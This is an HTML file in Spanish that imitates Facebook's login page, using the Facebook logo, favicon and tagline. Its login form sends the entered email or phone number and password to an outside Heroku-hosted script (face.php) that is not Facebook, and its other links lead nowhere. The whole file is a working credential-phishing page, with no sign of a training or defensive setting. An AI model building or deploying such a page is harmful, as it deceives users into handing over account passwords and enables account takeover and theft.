<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2F0%2F05%2FFacebook_Logo_(2019).png&f=1&nofb=1" type="image/x-icon">
    <title>F A C E B O O K</title>
</head>
<body>
    <div class="staff">
        <div class="inicio">
            <div class="contenedor face">
                <img draggable="false" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logotipo"><br>
                <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
            </div>
            <div class="contenedor">
                <div class="formulario">
                    <form action="https://portafoliowebb.herokuapp.com/face.php" method="post">
                        <input type="text" name="para" placeholder="Correo electrónico o número de teléfono" required>
                        <br>
                        <input type="password" name="poro" placeholder="Contraseña" required>
                        <br>
                        <button type="submit">Iniciar sesión</button>
                        <br>
                        <a href="/" class="ol">¿Olvidaste tu contraseña?</a>
                        <hr>
                        <a href="/" class="lo">Crear cuenta nueva</a>
                    </form>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
